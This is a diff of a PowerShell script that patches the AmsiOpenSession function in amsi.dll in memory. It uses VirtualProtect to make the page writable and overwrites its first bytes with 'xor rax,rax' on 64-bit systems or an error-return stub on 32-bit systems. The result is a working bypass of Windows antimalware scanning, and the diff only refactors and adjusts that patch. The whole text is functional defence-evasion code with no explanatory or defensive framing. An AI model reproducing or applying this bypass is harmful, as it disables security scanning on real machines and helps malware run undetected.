@@ -25,7 +25,7 @@ if([System.IntPtr]::Size -eq 4){
     $VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
     $VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
     $oldProtectionBuffer = 0
-    $VirtualProtect.Invoke($funcAddr,5, 0x40, [ref]$oldProtectionBuffer)
+    $VirtualProtect.Invoke($funcAddr,3, 0x40, [ref]$oldProtectionBuffer)
     $syserror = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
     #mov eax,80070057h
     #ret 18h
@@ -35,15 +35,17 @@ if([System.IntPtr]::Size -eq 4){
 }else
 {
     [IntPtr]$funcAddr = LookupFunc Amsi.dll AmsiOpenSession
+    $VirtualProtectAddr = LookupFunc kernel32.dll VirtualProtect
+    $VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
+    $VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
     $oldProtectionBuffer = 0
-    $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-    $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+    $VirtualProtect.Invoke($funcAddr,3, 0x40, [ref]$oldProtectionBuffer)
     $xorrax = [Byte[]] (0x48,0x31,0xC0)
     # xor rax,rax
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,0,$xorrax[0])
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,1,$xorrax[1])
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,2,$xorrax[2])
-    $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+    $VirtualProtect.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 }
 
 
